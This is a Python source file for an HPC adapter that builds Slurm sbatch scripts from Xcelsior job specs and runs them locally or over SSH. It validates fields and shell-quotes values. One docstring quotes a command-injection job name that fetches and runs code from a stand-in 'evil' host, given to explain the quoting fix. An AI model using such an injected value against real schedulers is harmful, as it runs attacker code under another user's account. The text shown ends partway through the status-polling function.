#!/usr/bin/env python3
# Xcelsior Slurm Adapter v3.0.0
# Bridges Xcelsior job scheduling with HPC Slurm clusters.
#
# Supports:
# - Translating Xcelsior jobs (GPU or CPU) to sbatch scripts
# - Cluster profiles: built-in (SHARCNET Nibi, Narval, generic) plus
#   operator-supplied profiles from a JSON file (XCELSIOR_SLURM_PROFILES_FILE)
# - Running Slurm commands locally or on a submit/login host over SSH
# - Polling squeue/sacct for job status, with a normalised state vocabulary
# - Accounting records in the shape per-second billing consumes
# - Bidirectional desired/observed reconcile against slurm_job_mappings
#
# Validation kit for a real two-node cluster: hpc/slurm-local/README.md.
# Production plan: hpc/IMPLEMENTATION_PLAN.md.

import json
import logging
import os
import re
import shlex
import subprocess
import time
from dataclasses import dataclass

log = logging.getLogger("xcelsior-slurm")

ADAPTER_VERSION = "3.0.0"

# ── Cluster Profiles ─────────────────────────────────────────────────
# Built-in profiles for known clusters. Operators add their own through a
# JSON file named by XCELSIOR_SLURM_PROFILES_FILE (see _load_profile_file).
#
# Profile keys:
#   name, cluster_id         display name; id stored on slurm_job_mappings
#   partition_gpu/_cpu       partition for GPU jobs / CPU-only jobs
#   gpu_type                 GRES type ("h100"); None requests untyped gpu:N
#   gpus_per_node            for multi-node packing
#   max_walltime             client-side ceiling, checked before sbatch
#   default_walltime         used when the job gives none (else a heuristic)
#   qos                      False: never emit --qos (most clusters reject
#                            QoS names they do not define)
#   mem_base_gb, mem_per_gpu_gb  memory request = base + per_gpu * gpus
#   modules, container_runtime ("apptainer" | "docker" | "none")
#   scratch_dir, project_dir, output_dir ({user}/{account} templates)
#   ssh_host, ssh_options    run Slurm commands on this host over SSH
#   remote_user              cluster account name, when ssh_host is an alias

CLUSTER_PROFILES = {
    "nibi": {
        # Nibi replaced Graham in 2025. Alliance lists 288 H100 GPUs; a
        # SHARCNET migration webinar gives 8 per node and 400 Gb/s Ethernet
        # on GPU nodes. Partition and module names are NOT verified against
        # docs.alliancecan.ca (bot-protected to automated reads) — check
        # them by hand before any real submission. hpc/IMPLEMENTATION_PLAN.md
        # tracks this.
        "name": "SHARCNET Nibi",
        "partition_gpu": "gpu",
        "partition_cpu": "compute",
        "account_env": "SLURM_ACCOUNT",
        "gpu_type": "h100",
        "gpus_per_node": 8,
        "max_walltime": "7-00:00:00",  # 7 days
        "modules": ["cuda/12.2", "python/3.11"],
        "container_runtime": "apptainer",
        "scratch_dir": "/scratch/{user}",
        "project_dir": "/project/{account}",
    },
    "graham": {
        # Retired in 2025; Nibi is its successor. Kept so existing callers
        # and stored mappings that name it keep resolving.
        "name": "Compute Canada Graham (retired)",
        "partition_gpu": "gpu",
        "partition_cpu": "compute",
        "account_env": "SLURM_ACCOUNT",
        "gpu_type": "v100",
        "gpus_per_node": 2,
        "max_walltime": "3-00:00:00",
        "modules": ["cuda/11.8", "python/3.10"],
        "container_runtime": "apptainer",
        "scratch_dir": "/scratch/{user}",
        "project_dir": "/project/{account}",
    },
    "narval": {
        "name": "Calcul Québec Narval",
        "partition_gpu": "gpu",
        "partition_cpu": "compute",
        "account_env": "SLURM_ACCOUNT",
        "gpu_type": "a100",
        "gpus_per_node": 4,
        "max_walltime": "7-00:00:00",
        "modules": ["cuda/12.2", "python/3.11"],
        "container_runtime": "apptainer",
        "scratch_dir": "/scratch/{user}",
        "project_dir": "/project/{account}",
    },
    "generic": {
        "name": "Generic Slurm Cluster",
        "partition_gpu": "gpu",
        "partition_cpu": "default",
        "account_env": "SLURM_ACCOUNT",
        # None → "--gres=gpu:N". The old literal "gpu" type produced
        # "gpu:gpu:N", which no cluster with typed or untyped GRES matches.
        "gpu_type": None,
        "gpus_per_node": 1,
        "max_walltime": "1-00:00:00",
        "modules": [],
        "container_runtime": "docker",
        "scratch_dir": "/tmp",
        "project_dir": "/home/{user}",
    },
}

_PROFILE_DEFAULTS = {
    "account_env": "SLURM_ACCOUNT",
    "gpu_type": None,
    "gpus_per_node": 1,
    "max_walltime": "1-00:00:00",
    "default_walltime": None,
    "qos": True,
    "mem_base_gb": 4,
    "mem_per_gpu_gb": 8,
    "modules": [],
    "container_runtime": "none",
    "scratch_dir": "/tmp",
    "project_dir": "/home/{user}",
    "output_dir": None,
    "ssh_host": None,
    "ssh_options": [],
    "remote_user": None,
}

_REQUIRED_PROFILE_KEYS = ("name", "partition_gpu", "partition_cpu")

PROFILES_FILE_ENV = "XCELSIOR_SLURM_PROFILES_FILE"

# ── GPU VRAM to Slurm GPU Count Mapping ──────────────────────────────

GPU_VRAM_TABLE = {
    "a100": 40,  # A100-40GB (80GB variant exists)
    "v100": 16,
    "t4": 16,
    "h100": 80,
    "l4": 24,
    "rtx_3060": 12,
    "rtx_3090": 24,
    "rtx_4090": 24,
}


class SlurmAdapterError(ValueError):
    """A request the adapter refuses before it reaches Slurm.

    ``code`` is machine-readable so API and MCP callers (agents included)
    can branch on it without parsing prose.
    """

    def __init__(self, code: str, message: str):
        super().__init__(message)
        self.code = code


def _error(code: str, message: str, **extra) -> dict:
    return {"error": message, "error_code": code, **extra}


# ── Profiles ─────────────────────────────────────────────────────────


def _load_profile_file() -> dict:
    """Read operator profiles from XCELSIOR_SLURM_PROFILES_FILE, if set.

    The file is ``{"profiles": {"<key>": {...}}}`` (a bare mapping also
    works). File profiles override built-ins with the same key.
    """
    path = os.environ.get(PROFILES_FILE_ENV, "").strip()
    if not path:
        return {}
    try:
        with open(path, encoding="utf-8") as fh:
            data = json.load(fh)
    except (OSError, json.JSONDecodeError) as e:
        raise SlurmAdapterError(
            "invalid_profile_file", f"cannot read {PROFILES_FILE_ENV}={path}: {e}"
        ) from e
    profiles = data.get("profiles", data) if isinstance(data, dict) else None
    if not isinstance(profiles, dict):
        raise SlurmAdapterError("invalid_profile_file", f"{path}: expected an object of profiles")
    for key, prof in profiles.items():
        if not isinstance(prof, dict):
            raise SlurmAdapterError(
                "invalid_profile_file", f"{path}: profile {key!r} is not an object"
            )
        missing = [k for k in _REQUIRED_PROFILE_KEYS if k not in prof]
        if missing:
            raise SlurmAdapterError(
                "invalid_profile_file", f"{path}: profile {key!r} missing {missing}"
            )
    return profiles


def available_profiles() -> dict:
    """Built-in profiles merged with any operator profile file."""
    return {**CLUSTER_PROFILES, **_load_profile_file()}


def _get_profile(profile_name=None):
    """Resolve a profile by name, then env, then ``generic``.

    An unknown name is an error. It used to fall back to ``generic``
    silently, so a typo such as ``nibbi`` submitted with the wrong
    partitions, GPU type and runtime.
    """
    name = profile_name or os.environ.get("XCELSIOR_SLURM_PROFILE") or "generic"
    profiles = available_profiles()
    if name not in profiles:
        raise SlurmAdapterError(
            "unknown_profile", f"unknown Slurm profile {name!r}; known: {sorted(profiles)}"
        )
    merged = {**_PROFILE_DEFAULTS, **profiles[name]}
    merged["_key"] = name
    merged["cluster_id"] = merged.get("cluster_id") or name
    return merged


# ── Command transport ────────────────────────────────────────────────


@dataclass(frozen=True)
class SlurmRunner:
    """Runs Slurm client commands locally, or on a submit host over SSH.

    The SSH form sends one argv per connection, shell-quoted, with the
    batch script on stdin. That is the shape a forced-command wrapper on a
    restricted key can validate (hpc/slurm-local/scripts/xcl-slurm-gate),
    which is how Alliance "robot" automation nodes admit automated access.
    """

    ssh_host: str | None = None
    ssh_options: tuple = ()
    connect_timeout: int = 10

    @property
    def remote(self) -> bool:
        return bool(self.ssh_host)

    def run(self, argv, *, input_text=None, timeout=30, env=None):
        if self.ssh_host:
            prefix = ["env", *[f"{k}={v}" for k, v in (env or {}).items()]] if env else []
            remote_cmd = shlex.join([*prefix, *argv])
            cmd = [
                "ssh",
                "-o",
                "BatchMode=yes",
                "-o",
                f"ConnectTimeout={self.connect_timeout}",
                *self.ssh_options,
                self.ssh_host,
                remote_cmd,
            ]
            return subprocess.run(
                cmd, input=input_text, capture_output=True, text=True, timeout=timeout
            )
        full_env = {**os.environ, **env} if env else None
        return subprocess.run(
            argv,
            input=input_text,
            capture_output=True,
            text=True,
            timeout=timeout,
            env=full_env,
        )


def get_runner(profile=None) -> SlurmRunner:
    """Pick the transport: env overrides the profile; default is local."""
    profile = profile or {}
    host = os.environ.get("XCELSIOR_SLURM_SSH_HOST", "").strip() or profile.get("ssh_host")
    env_opts = os.environ.get("XCELSIOR_SLURM_SSH_OPTIONS", "").strip()
    opts = shlex.split(env_opts) if env_opts else list(profile.get("ssh_options") or [])
    return SlurmRunner(ssh_host=host or None, ssh_options=tuple(opts))


def _resolve(profile_name=None, runner=None):
    profile = _get_profile(profile_name)
    return profile, (runner or get_runner(profile))


def _transport_failure(r, runner) -> dict | None:
    """Map SSH-level failures to error dicts; None means 'Slurm answered'.

    Only remote runs can fail this way: locally a missing client raises
    FileNotFoundError, and exit 255 is ssh's own "could not connect".
    """
    if not runner.remote:
        return None
    if r.returncode == 255:
        return _error("transport_error", f"ssh to submit host failed: {r.stderr.strip()}")
    if r.returncode == 127 or "command not found" in (r.stderr or ""):
        return _error("slurm_unavailable", "Slurm client commands not found on the submit host")
    return None


# ── Slurm Availability Check ─────────────────────────────────────────


def is_slurm_available(runner=None):
    """Check if Slurm commands (sbatch, squeue, sacct) are available."""
    runner = runner or SlurmRunner()
    try:
        r = runner.run(["sinfo", "--version"], timeout=15 if runner.remote else 5)
        return r.returncode == 0
    except (FileNotFoundError, PermissionError, OSError, subprocess.TimeoutExpired):
        return False


def _slurm_reachable(runner):
    # The zero-argument call is deliberate: it keeps the local path
    # patchable as ``slurm_adapter.is_slurm_available`` the way callers and
    # tests always have. Remote runners skip the pre-check — the real
    # command reports a missing client (127) or a dead link (255) itself,
    # without a second SSH round trip.
    if runner.remote:
        return True
    return is_slurm_available()


def get_cluster_info(runner=None):
    """Get basic info about the Slurm cluster."""
    runner = runner or SlurmRunner()
    if not is_slurm_available(runner):
        return None

    info = {}
    try:
        r = runner.run(["sinfo", "-N", "--noheader", "-o", "%N %P %G %m"], timeout=15)
        if r.returncode == 0:
            nodes = []
            for line in r.stdout.strip().split("\n"):
                parts = line.split()
                if len(parts) >= 4:
                    nodes.append(
                        {
                            "name": parts[0],
                            "partition": parts[1].rstrip("*"),
                            "gres": parts[2],
                            "memory_mb": int(parts[3]) if parts[3].isdigit() else 0,
                        }
                    )
            info["nodes"] = nodes
            info["node_count"] = len(nodes)
    except Exception as e:
        log.debug("sinfo failed: %s", e)

    return info


def get_cluster_inventory(profile_name=None, runner=None, partition=None):
    """Node inventory for one partition: CPUs, memory, GRES, state.

    Returns {"nodes": [...], "raw": stdout} or an error dict. Used by the
    pod spec builder (slurm_pod.py), which needs exact per-node numbers.
    """
    try:
        profile, runner = _resolve(profile_name, runner)
    except SlurmAdapterError as e:
        return _error(e.code, str(e))
    part = partition or profile["partition_gpu"]
    argv = ["sinfo", "-N", "--noheader", "-p", part, "-o", "%N|%P|%c|%m|%G|%T"]
    try:
        r = runner.run(argv, timeout=20)
    except FileNotFoundError:
        return _error("slurm_unavailable", "Slurm not available on this system")
    except subprocess.TimeoutExpired:
        return _error("timeout", "sinfo timed out")
    failure = _transport_failure(r, runner)
    if failure:
        return failure
    if r.returncode != 0:
        return _error("sinfo_failed", r.stderr.strip())
    nodes = {}
    for line in r.stdout.strip().splitlines():
        parts = line.split("|")
        if len(parts) < 6:
            continue
        name = parts[0]
        nodes.setdefault(
            name,
            {
                "name": name,
                "partitions": [],
                "cpus": int(parts[2]) if parts[2].isdigit() else 0,
                "memory_mb": int(parts[3]) if parts[3].isdigit() else 0,
                "gres": parts[4],
                "state": parts[5],
            },
        )["partitions"].append(parts[1].rstrip("*"))
    return {"partition": part, "nodes": list(nodes.values()), "raw": r.stdout}


# ── Job Translation ──────────────────────────────────────────────────

_JOB_ID_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9_.-]{0,63}$")
_SLURM_TOKEN_RE = re.compile(r"^[A-Za-z0-9_.:+-]{1,128}$")
_NODELIST_RE = re.compile(r"^[A-Za-z0-9_.,\[\]-]{1,512}$")
_ENV_KEY_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]{0,127}$")
_IMAGE_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._/:@+-]{0,255}$")
_PATH_RE = re.compile(r"^/[A-Za-z0-9_./%-]*$")
_SLURM_JOB_ID_RE = re.compile(r"^\d{1,12}(?:_\d{1,9})?$")
# Characters that are inert inside a double-quoted bash string.
_DQ_SAFE_RE = re.compile(r"^[A-Za-z0-9 _.,:/@+=%-]*$")


def _shell_value(value) -> str:
    """Quote a value for a bash assignment.

    Ordinary values keep the readable ``"value"`` form; anything with
    ``$``, backticks, quotes, backslashes or newlines is single-quoted by
    shlex. The old code interpolated raw values into double quotes, so a
    job name like ``x"; curl evil | sh; "`` ran on the cluster as the
    submitting account.
    """
    s = str(value)
    if _DQ_SAFE_RE.match(s):
        return f'"{s}"'
    return shlex.quote(s)


def _walltime_seconds(spec: str) -> int:
    """Parse a Slurm time limit: M, M:S, H:M:S, D-H, D-H:M, D-H:M:S."""
    s = str(spec).strip()
    days = 0
    if "-" in s:
        d, s = s.split("-", 1)
        if not d.isdigit():
            raise SlurmAdapterError("invalid_job_spec", f"invalid walltime {spec!r}")
        days = int(d)
        parts = s.split(":")
        if not all(p.isdigit() for p in parts) or not 1 <= len(parts) <= 3:
            raise SlurmAdapterError("invalid_job_spec", f"invalid walltime {spec!r}")
        h, m, sec = (list(map(int, parts)) + [0, 0])[:3]
        return days * 86400 + h * 3600 + m * 60 + sec
    parts = s.split(":")
    if not all(p.isdigit() for p in parts) or not 1 <= len(parts) <= 3:
        raise SlurmAdapterError("invalid_job_spec", f"invalid walltime {spec!r}")
    nums = list(map(int, parts))
    if len(nums) == 1:
        return nums[0] * 60
    if len(nums) == 2:
        return nums[0] * 60 + nums[1]
    return nums[0] * 3600 + nums[1] * 60 + nums[2]


def _estimate_gpus_needed(vram_needed_gb, gpu_type):
    """Estimate how many GPUs are needed for a given VRAM requirement."""
    vram_per_gpu = GPU_VRAM_TABLE.get((gpu_type or "").lower(), 16)
    if vram_needed_gb <= 0:
        return 1
    return max(1, -(-int(vram_needed_gb) // vram_per_gpu))  # ceil division


def _priority_to_qos(priority):
    """Map Xcelsior priority/tier to Slurm QoS."""
    if priority >= 90:
        return "premium"
    elif priority >= 50:
        return "normal"
    elif priority >= 10:
        return "low"
    return "default"


def _estimate_walltime(job_name, default="4:00:00"):
    """Estimate walltime based on job/model name heuristics."""
    name = job_name.lower()
    if any(k in name for k in ["llama-70b", "falcon-180b", "gpt-j-6b"]):
        return "24:00:00"
    if any(k in name for k in ["llama-13b", "mistral-7b", "codellama"]):
        return "12:00:00"
    if any(k in name for k in ["llama-7b", "phi-2", "gemma"]):
        return "6:00:00"
    return default


def _remote_user(profile, runner) -> str:
    if profile.get("remote_user"):
        return str(profile["remote_user"])
    host = runner.ssh_host if runner else None
    if host and "@" in host:
        return host.split("@", 1)[0]
    return os.environ.get("USER", "xcelsior")


def _output_dir(profile, user: str, account: str) -> str:
    template = profile.get("output_dir") or profile["scratch_dir"]
    path = template.format(user=user, account=account).rstrip("/") or "/"
    if not _PATH_RE.match(path):
        raise SlurmAdapterError(
            "invalid_profile", f"output_dir {path!r} is not a plain absolute path"
        )
    return path


def _require(pattern, value, field):
    if not isinstance(value, str) or not pattern.match(value):
        raise SlurmAdapterError("invalid_job_spec", f"invalid {field}: {value!r}")
    return value


def xcelsior_job_to_sbatch(job, profile_name=None, extra_env=None, runner=None):
    """Translate an Xcelsior job dict into an sbatch script string.

    Args:
        job: Xcelsior job dict. Keys: job_id, name, vram_needed_gb,
            priority, tier, image, and optionally:
              num_gpus   0 → CPU-only job on the profile's CPU partition
              command    payload run with ``bash -c`` (inside the image
                         when one is given)
              nodelist   pin to node(s), e.g. "asus"
              partition  override the profile's partition
              cpus       --cpus-per-task
              mem_gb     override the memory formula
              walltime   Slurm time limit, checked against max_walltime
        profile_name: Cluster profile name
        extra_env: Additional environment variables dict
        runner: transport, used only to resolve the remote account name

    Returns:
        (script: str, metadata: dict)

    Raises:
        SlurmAdapterError for unknown profiles and invalid job fields.
    """
    profile = _get_profile(profile_name)
    if runner is None:
        runner = get_runner(profile)

    job_id = str(job.get("job_id", "unknown"))
    _require(_JOB_ID_RE, job_id, "job_id")
    job_name = f"xcl-{job_id}"

    gpu_type = profile.get("gpu_type") or None
    if gpu_type is not None:
        _require(_SLURM_TOKEN_RE, gpu_type, "gpu_type")
    num_gpus = job.get("num_gpus", None)
    if num_gpus is None:
        num_gpus = _estimate_gpus_needed(job.get("vram_needed_gb", 0), gpu_type)
    if isinstance(num_gpus, bool) or not isinstance(num_gpus, int) or num_gpus < 0:
        raise SlurmAdapterError("invalid_job_spec", f"invalid num_gpus: {num_gpus!r}")

    partition = job.get("partition") or (
        profile["partition_gpu"] if num_gpus > 0 else profile["partition_cpu"]
    )
    _require(_SLURM_TOKEN_RE, partition, "partition")

    if job.get("walltime"):
        walltime = str(job["walltime"])
    elif profile.get("default_walltime"):
        walltime = str(profile["default_walltime"])
    else:
        walltime = _estimate_walltime(job.get("name", ""))
    if _walltime_seconds(walltime) > _walltime_seconds(profile["max_walltime"]):
        raise SlurmAdapterError(
            "walltime_exceeds_limit",
            f"walltime {walltime} exceeds profile max {profile['max_walltime']}",
        )

    priority = job.get("priority", 0) or 0
    qos = _priority_to_qos(priority)

    account = os.environ.get(profile["account_env"], "")
    if account:
        _require(_SLURM_TOKEN_RE, account, "account")
    user = _remote_user(profile, runner)
    out_dir = _output_dir(profile, user, account)
    scratch_sh = profile["scratch_dir"].format(user="${USER}", account=account)

    nodelist = job.get("nodelist")
    if nodelist:
        _require(_NODELIST_RE, nodelist, "nodelist")
    cpus = job.get("cpus")
    if cpus is not None and (isinstance(cpus, bool) or not isinstance(cpus, int) or cpus < 1):
        raise SlurmAdapterError("invalid_job_spec", f"invalid cpus: {cpus!r}")

    lines = [
        "#!/bin/bash",
        f"#SBATCH --job-name={job_name}",
        f"#SBATCH --partition={partition}",
    ]
    if num_gpus > 0:
        gres = f"gpu:{gpu_type}:{num_gpus}" if gpu_type else f"gpu:{num_gpus}"
        lines.append(f"#SBATCH --gres={gres}")
    lines += [
        f"#SBATCH --time={walltime}",
        # Output goes straight into a directory that already exists. Slurm
        # opens these files before the script runs, so the old
        # "<scratch>/xcelsior/" path — created by `mkdir` *inside* the
        # script — failed the first job on every node.
        f"#SBATCH --output={out_dir}/{job_name}-%j.out",
        f"#SBATCH --error={out_dir}/{job_name}-%j.err",
        # Lets a reconcile find this job by Xcelsior id after a crash
        # between sbatch and the mapping insert.
        f"#SBATCH --comment=xcelsior:{job_id}",
    ]

    if account:
        lines.append(f"#SBATCH --account={account}")

    # Attempt to set QoS (may not be available on all clusters)
    if profile.get("qos", True) and qos != "default":
        lines.append(f"#SBATCH --qos={qos}")

    # Nodes and tasks
    if num_gpus > 0:
        nodes_needed = max(1, -(-num_gpus // int(profile["gpus_per_node"])))
    else:
        nodes_needed = 1
    if nodes_needed > 1:
        lines.append(f"#SBATCH --nodes={nodes_needed}")
        lines.append("#SBATCH --ntasks-per-node=1")
    else:
        lines.append("#SBATCH --nodes=1")
        lines.append("#SBATCH --ntasks=1")
    if nodelist:
        lines.append(f"#SBATCH --nodelist={nodelist}")
    if cpus:
        lines.append(f"#SBATCH --cpus-per-task={cpus}")

    # Memory (default: 8GB per GPU + 4GB base; profiles can scale it down)
    if job.get("mem_gb") is not None:
        mem_gb = job["mem_gb"]
        if isinstance(mem_gb, bool) or not isinstance(mem_gb, int) or mem_gb < 1:
            raise SlurmAdapterError("invalid_job_spec", f"invalid mem_gb: {mem_gb!r}")
    else:
        mem_gb = int(profile["mem_base_gb"]) + int(profile["mem_per_gpu_gb"]) * num_gpus
    lines.append(f"#SBATCH --mem={mem_gb}G")

    # Email notifications (optional)
    email = os.environ.get("XCELSIOR_SLURM_EMAIL", "")
    if email and re.match(r"^[^\s@]+@[^\s@]+$", email):
        lines.append(f"#SBATCH --mail-user={email}")
        lines.append("#SBATCH --mail-type=END,FAIL")

    lines.append("")
    lines.append("# ── Environment Setup ──")
    lines.append("set -euo pipefail")

    # Load modules
    for mod in profile["modules"]:
        lines.append(f"module load {shlex.quote(str(mod))}")
    if profile["modules"]:
        lines.append("")

    # Environment variables
    lines.append("# ── Xcelsior Job Metadata ──")
    lines.append(f"export XCELSIOR_JOB_ID={job_id}")
    lines.append(f"export XCELSIOR_JOB_NAME={_shell_value(job.get('name', ''))}")
    lines.append(f"export XCELSIOR_TIER={_shell_value(job.get('tier', 'free'))}")
    lines.append(f"export XCELSIOR_NUM_GPUS={num_gpus}")

    if extra_env:
        lines.append("")
        for k, v in extra_env.items():
            _require(_ENV_KEY_RE, k, "extra_env key")
            lines.append(f"export {k}={_shell_value(v)}")

    lines.append("")

    container_rt = profile["container_runtime"]
    image = job.get("image", "") or ""
    if image:
        _require(_IMAGE_RE, image, "image")
    command = job.get("command")
    if command is not None and not isinstance(command, str):
        raise SlurmAdapterError("invalid_job_spec", "command must be a string")
    payload = f"bash -c {shlex.quote(command)}" if command else ""

    if container_rt == "apptainer" and image:
        # HPC clusters typically use Apptainer (formerly Singularity)
        work = f"{scratch_sh}/xcelsior"
        sif_path = f'"{work}/{job_id}.sif"'
        lines.append("# ── Container Execution (Apptainer) ──")
        lines.append(f'mkdir -p "{work}"')
        lines.append(f"apptainer pull --force {sif_path} {shlex.quote('docker://' + image)}")
        if payload:
            lines.append(f"apptainer exec --nv {sif_path} {payload}")
        else:
            lines.append(
                f"apptainer exec --nv {sif_path} python -c 'print(\"Xcelsior job {job_id} running\")'"
            )
    elif container_rt == "docker" and image:
        # NOTE: the Docker daemon starts the container outside the job's
        # cgroup, so Slurm's CPU/memory limits do not apply. GPU selection
        # uses the job's *physical* GPU ids (SLURM_JOB_GPUS). Prefer
        # apptainer or a bare command on shared clusters.
        lines.append("# ── Container Execution (Docker) ──")
        lines.append(f"docker pull {shlex.quote(image)}")
        gpu_flag = (
            '--gpus "\\"device=${SLURM_JOB_GPUS:-${CUDA_VISIBLE_DEVICES:-0}}\\"" '
            if num_gpus > 0
            else ""
        )
        lines.append(
            f"docker run --rm {gpu_flag}{shlex.quote(image)}{' ' + payload if payload else ''}"
        )
    elif payload:
        lines.append("# ── Payload ──")
        lines.append(payload)
    else:
        lines.append("# ── Inference Script ──")
        lines.append('echo "Running Xcelsior job ${XCELSIOR_JOB_ID}: ${XCELSIOR_JOB_NAME}"')
        lines.append("# Add your inference command here:")
        lines.append(
            '# python inference.py --model "$XCELSIOR_JOB_NAME" --gpus "$XCELSIOR_NUM_GPUS"'
        )

    lines.append("")
    lines.append(f'echo "Xcelsior job {job_id} completed at $(date)"')

    metadata = {
        "job_id": job_id,
        "slurm_job_name": job_name,
        "profile": profile["_key"],
        "cluster_id": profile["cluster_id"],
        "partition": partition,
        "num_gpus": num_gpus,
        "gpu_type": gpu_type,
        "walltime": walltime,
        "qos": qos,
        "nodes": nodes_needed,
        "nodelist": nodelist or None,
        "mem_gb": mem_gb,
        "output_path": f"{out_dir}/{job_name}-%j.out",
        "error_path": f"{out_dir}/{job_name}-%j.err",
        "adapter_version": ADAPTER_VERSION,
    }

    return "\n".join(lines), metadata


# ── Error classification ─────────────────────────────────────────────
# sbatch stderr → machine-readable code. Order matters: first match wins.

_SBATCH_ERROR_PATTERNS = (
    (re.compile(r"invalid partition", re.I), "invalid_partition"),
    (re.compile(r"Invalid generic resource|invalid gres", re.I), "invalid_gres"),
    (re.compile(r"Invalid qos", re.I), "invalid_qos"),
    (re.compile(r"Invalid account|Invalid user id|association", re.I), "invalid_account"),
    (re.compile(r"Invalid node name|invalid nodelist", re.I), "invalid_nodelist"),
    (re.compile(r"time limit", re.I), "walltime_exceeds_limit"),
    (re.compile(r"Requested node configuration is not available", re.I), "unsatisfiable_request"),
    (re.compile(r"Memory specification can not be satisfied", re.I), "unsatisfiable_request"),
    (re.compile(r"Node count specification invalid", re.I), "unsatisfiable_request"),
    (re.compile(r"configuration not available", re.I), "unsatisfiable_request"),
    (
        re.compile(r"Unable to contact slurm controller|Connection refused|Zero Bytes", re.I),
        "controller_unreachable",
    ),
)


def classify_slurm_error(stderr: str, default: str = "sbatch_rejected") -> str:
    for pattern, code in _SBATCH_ERROR_PATTERNS:
        if pattern.search(stderr or ""):
            return code
    return default


# ── Slurm Submission ─────────────────────────────────────────────────


def submit_to_slurm(job, profile_name=None, extra_env=None, dry_run=False, runner=None):
    """Submit an Xcelsior job to a Slurm cluster.

    Args:
        job: Xcelsior job dict (see xcelsior_job_to_sbatch)
        profile_name: Cluster profile name
        extra_env: Additional environment variables
        dry_run: If True, return script without submitting
        runner: transport override (default: from env / profile)

    Returns:
        dict with slurm_job_id and metadata, or error + error_code.
        Rejections come back from sbatch itself, synchronously; with
        EnforcePartLimits=ALL a request no node or partition can satisfy
        is refused at submit time instead of pending forever.
    """
    try:
        profile, runner = _resolve(profile_name, runner)
        script, metadata = xcelsior_job_to_sbatch(job, profile_name, extra_env, runner=runner)
    except SlurmAdapterError as e:
        return _error(e.code, str(e))

    if dry_run:
        return {"script": script, "metadata": metadata, "dry_run": True}

    if not _slurm_reachable(runner):
        return _error("slurm_unavailable", "Slurm not available on this system")

    try:
        # The script goes over stdin (no temp file left behind on the
        # submit host). --parsable prints "<jobid>[;<cluster>]".
        result = runner.run(["sbatch", "--parsable"], input_text=script, timeout=30)
    except subprocess.TimeoutExpired:
        return _error("timeout", "sbatch timed out")
    except FileNotFoundError:
        return _error("slurm_unavailable", "Slurm not available on this system")
    except Exception as e:
        return _error("adapter_exception", str(e))

    failure = _transport_failure(result, runner)
    if failure:
        return {**failure, "script": script}
    if result.returncode != 0:
        stderr = result.stderr.strip()
        return {
            **_error(classify_slurm_error(stderr), f"sbatch failed: {stderr}"),
            "script": script,
        }

    first = (result.stdout.strip().splitlines() or [""])[0]
    match = re.match(r"^(\d+)", first) or re.search(r"Submitted batch job (\d+)", result.stdout)
    if not match:
        return _error("unparseable_sbatch_output", f"sbatch succeeded but printed {first!r}")
    slurm_job_id = match.group(1)

    log.info("Submitted Xcelsior job %s as Slurm job %s", job.get("job_id", "?"), slurm_job_id)

    return {
        "slurm_job_id": slurm_job_id,
        "xcelsior_job_id": job.get("job_id"),
        "cluster_id": metadata["cluster_id"],
        "metadata": metadata,
    }


# ── Status Polling ───────────────────────────────────────────────────

# Slurm job state → Xcelsior job state. Covers every state squeue/sacct
# document (JOB STATE CODES). Anything else maps to "unknown", never to a
# guess: the old fallbacks called unknown states "running" from squeue
# and "failed" from sacct.
SLURM_STATE_MAP = {
    "PENDING": "queued",
    "REQUEUED": "queued",
    "REQUEUE_HOLD": "queued",
    "REQUEUE_FED": "queued",
    "RESV_DEL_HOLD": "queued",
    "SUSPENDED": "queued",
    "CONFIGURING": "running",
    "RUNNING": "running",
    "COMPLETING": "running",
    "RESIZING": "running",
    "SIGNALING": "running",
    "STAGE_OUT": "running",
    "STOPPED": "running",
    "COMPLETED": "completed",
    "FAILED": "failed",
    "BOOT_FAIL": "failed",
    "DEADLINE": "failed",
    "NODE_FAIL": "failed",
    "OUT_OF_MEMORY": "failed",
    "SPECIAL_EXIT": "failed",
    "TIMEOUT": "failed",
    "CANCELLED": "cancelled",
    "REVOKED": "cancelled",
    "PREEMPTED": "preempted",
}

# Xcelsior job state → slurm_job_mappings.observed_state, whose CHECK
# constraint (migration 067) allows only pending/running/completed/failed/
# cancelled/unknown. Writing "queued" there raised CheckViolation and
# aborted the whole sync pass the first time a real job was pending.
OBSERVED_STATE_MAP = {
    "queued": "pending",
    "running": "running",
    "completed": "completed",
    "failed": "failed",
    "cancelled": "cancelled",
    # No 'preempted' in the constraint yet (plan item); a preempted Slurm
    # job is terminal and was stopped by the cluster, not the job.
    "preempted": "cancelled",
    "unknown": "unknown",
}


def normalize_slurm_state(raw: str) -> str:
    """'CANCELLED by 1000' → 'CANCELLED'; 'CANCELLED+' → 'CANCELLED'."""
    token = (raw or "").strip().split(" ", 1)[0].rstrip("+")
    return token.upper() or "UNKNOWN"


def xcelsior_state_for(raw: str) -> str:
    return SLURM_STATE_MAP.get(normalize_slurm_state(raw), "unknown")


def get_slurm_job_status(slurm_job_id, *, profile_name=None, runner=None):
    """Get the current status of a Slurm job.

    squeue answers while the controller still holds the job (until
    MinJobAge after it ends); sacct answers after that.

    Returns:
        dict with slurm_state, xcelsior_state, job_info
    """
    if not _SLURM_JOB_ID_RE.match(str(slurm_job_id)):
        return _error("invalid_job_id", f"invalid Slurm job id: {slurm_job_id!r}")
    try:
        _profile, runner = _resolve(profile_name, runner)
    except SlurmAdapterError as e:
        return _error(e.code, str(e))
    if not _slurm_reachable(runner):
        return _error("slurm_unavailable", "Slurm not available")

    try:
        # Try squeue first (for running/pending jobs)
        r = runner.run(
            ["squeue", "-j", str(slurm_job_id), "--noheader", "-o", "%i %T %M %l %D %R"],
            timeout=10,
        )
        failure = _transport_failure(r, runner)
        if failure:
            return failure

        if r.returncode == 0 and r.stdout.strip():
            # Format is "%i %T %M %l %D %R": the first five fields are
            # single tokens, but %R (reason / nodelist) can contain spaces
            # — e.g. "(launch failed requeued held)". Cap the split at 5 so
            # the reason is preserved intact instead of truncated to its
            # first word. squeue -j for a single id returns one line.
            parts = r.stdout.strip().split(None, 5)
            slurm_state = normalize_slurm_state(parts[1]) if len(parts) > 1 else "UNKNOWN"
            return {
                "slurm_job_id": slurm_job_id,
                "slurm_state": slurm_state,
                "xcelsior_state": SLURM_STATE_MAP.get(slurm_state, "unknown"),
                "elapsed": parts[2] if len(parts) > 2 else "0:00",
                "time_limit": parts[3] if len(parts) > 3 else "?",
                "nodes": parts[4] if len(parts) > 4 else "1",
                "reason": parts[5] if len(parts) > 5 else "",
                "source": "squeue",
            }

